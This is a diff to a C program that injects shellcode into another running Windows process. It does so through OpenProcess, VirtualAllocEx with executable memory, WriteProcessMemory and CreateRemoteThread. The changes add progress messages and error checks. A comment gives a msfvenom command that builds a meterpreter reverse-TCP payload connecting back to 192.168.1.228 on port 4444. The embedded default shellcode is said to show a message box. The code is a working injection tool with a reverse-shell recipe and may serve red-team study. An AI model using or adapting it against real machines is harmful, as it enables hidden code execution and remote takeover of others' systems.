@@ -8,7 +8,11 @@ int main(void) {
 
 	// Change this
 	const char* ProcessToInject = "nodepad.exe";
-
+	
+	// You can generate a shellcode using msfvenom
+	// msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.228 lport=4444 -f c
+	
+	// This default shellcode pop up a message box
 	// Change the shellcode variable to your shell code
 	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 						"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
@@ -41,29 +45,41 @@ int main(void) {
 						"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
 
+	printf("[!] Finding process ID...\n");
 	int PID = getProcessIdByName(ProcessToInject);
 	if (PID == 0) {
-		printf("Failed to get process id.\n");
+		printf("[-] Failed to get process id.\n");
 		return -1;
 	}
 
+	printf("[!] Opening Process...\n");
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
 	if (hProcess == NULL) {
-		printf("Failed to open process.\n");
+		printf("[-] Failed to open process.\n");
+		system("pause");
 		return -1;
 	}
+	
+	printf("[!] Allocating memory into process...\n");
 
 	LPVOID exec = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	printf("[!] Writing shellcode into process...\n");
 	if (WriteProcessMemory(hProcess, exec, shellcode, sizeof(shellcode), NULL) == 0) {
-		printf("Failed to write memory.\n");
+		printf("[-] Failed to write memory.\n");
+		system("pause");
 		return -1;
 	}
 
+	printf("[!] Creating a thread into process...\n");
 	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
-
+	if (hThread == NULL) {
+		printf("[-] Failed to create thread.\n");
+		system("pause");
+		return -1;
+	}
 	CloseHandle(hProcess);
 
-	printf("The shell code seem to be injected...\n");
+	printf("[+] Shellcode was successfully injected!\n");
 	system("pause");
 
 	return 0;
